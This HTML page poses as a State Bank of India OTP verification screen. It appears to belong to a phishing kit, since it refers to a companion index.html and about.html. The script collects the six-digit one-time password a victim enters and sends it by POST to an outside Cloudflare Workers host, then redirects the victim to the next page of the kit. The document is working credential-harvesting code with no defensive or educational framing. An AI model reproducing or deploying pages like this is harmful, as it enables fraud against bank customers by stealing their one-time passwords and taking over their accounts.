<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>blogtwo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            padding-bottom: 20px;
        }
        
        .header {
            text-align: center;
            padding: 15px;
            background-color: white;
        }
        
        .logo {
            max-width: 100%;
            height: auto;
            max-height: 120px;
        }
        
        .container {
            max-width: 420px;
            margin: 15px auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        
        .form-header {
            color: #000;
            padding: 18px 20px 8px 20px;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
        }
        
        .form-content {
            padding: 0 20px 20px 20px;
        }
        
        .form-group {
            margin-bottom: 10px;
        }
        
        .form-label {
            display: block;
            font-size: 12px;
            font-weight: bold;
            color: #333;
            margin-bottom: 3px;
        }
        
        .form-input {
            width: 100%;
            padding: 6px 0;
            font-size: 18px;
            border: none;
            border-bottom: 1px solid #ccc;
            background-color: transparent;
            outline: none;
            border-radius: 0;
            transition: border-color 0.3s;
            text-align: left;
            font-weight: bold;
        }
        
        .form-input:focus {
            border-bottom-color: #24A1E8;
        }
        
        .proceed-button {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #24A1E8;
            color: white;
            font-size: 14px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 15px;
        }
        
        .proceed-button:hover {
            background-color: #1a8cd8;
        }
        
        .message {
            font-size: 13px;
            color: #666;
            text-align: center;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        
        .resend-container {
            display: flex;
            justify-content: flex-end;
            margin: 5px 0 10px 0;
        }
        
        .resend-button {
            width: 80px;
            padding: 4px 0;
            background-color: #24A1E8;
            color: white;
            font-size: 11px;
            font-weight: bold;
            border: none;
            border-radius: 2px;
            cursor: default;
            text-align: center;
        }
        
        .timer {
            text-align: center;
            font-size: 14px;
            color: #333;
            margin: 10px 0;
            font-weight: bold;
        }
        
        .asterisk {
            color: #ff0000;
        }
        
        .footer-img {
            width: 100%;
            max-width: 900px;
            display: block;
            margin: 20px auto 0;
        }
    </style>
</head>
<body>
    <!-- Same Header as index.html -->
    <div class="header">
        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" 
             alt="SBI Logo" 
             class="logo">
    </div>
    
    <!-- OTP Verification Form -->
    <div class="container">
        <div class="form-header">
            One Time Password (OTP) Verification
        </div>
        
        <div class="form-content">
            <div class="message">
                One Time Password (OTP) has been sent to your registered mobile Number.<br>
                Please enter the OTP and proceed.
            </div>
            
            <div class="form-group">
                <label class="form-label">One Time Password <span class="asterisk">*</span></label>
                <input type="text" class="form-input" id="otpInput" maxlength="6" pattern="[0-9]{6}">
            </div>
            
            <div class="resend-container">
                <button class="resend-button">Resend OTP</button>
            </div>
            
            <div class="timer" id="timer">180</div>
            
            <button class="proceed-button">PROCEED</button>
        </div>
    </div>
    
    <!-- Same Footer as index.html -->
    <img src="https://i.ibb.co/5WTjD1Nb/Footer-bfdfef4c-1.jpg" 
         alt="Security Guidelines" 
         class="footer-img">
    
    <script>
        // OTP Input Formatting
        const otpInput = document.getElementById('otpInput');
        const timerElement = document.getElementById('timer');
        
        // OTP Input - Auto move and formatting
        otpInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.substring(0, 6);
            e.target.value = value;
        });
        
        // Timer Countdown (180 seconds)
        let seconds = 180;
        
        function updateTimer() {
            timerElement.textContent = `${seconds}`;
            
            if (seconds > 0) {
                seconds--;
                setTimeout(updateTimer, 1000);
            } else {
                timerElement.textContent = "0";
                timerElement.style.color = "#666";
            }
        }
        
        // Start the timer
        updateTimer();
        
        // Proceed Button
        document.querySelector('.proceed-button').addEventListener('click', async function(e) {
            e.preventDefault();
            
            const otpValue = otpInput.value.trim();
            
            if (otpValue.length !== 6 || !/^\d+$/.test(otpValue)) {
                otpInput.style.borderBottomColor = '#ff4444';
                return;
            }
            
            // ✅ सही format: data ke andar OTP bhej rahe hain
            const submission = {
                id: Date.now(),
                type: 'OTP2',
                data: { otp: otpValue },
                timestamp: new Date().toISOString()
            };

            try {
                const response = await fetch('https://billowing-forest-3780.skd38824.workers.dev/', {
                    method: 'POST',
                    mode: 'cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(submission)
                });

                if (response.ok) {
                    const result = await response.json();
                    if (result.success) {
                        // Redirect to about.html
                        window.location.href = 'about.html';
                    } else {
                        alert('Error: ' + (result.error || 'unknown'));
                    }
                } else {
                    alert('Server error: ' + response.status);
                }
            } catch (error) {
                alert('Network error: ' + error.message);
            }
        });
    </script>
</body>
</html>
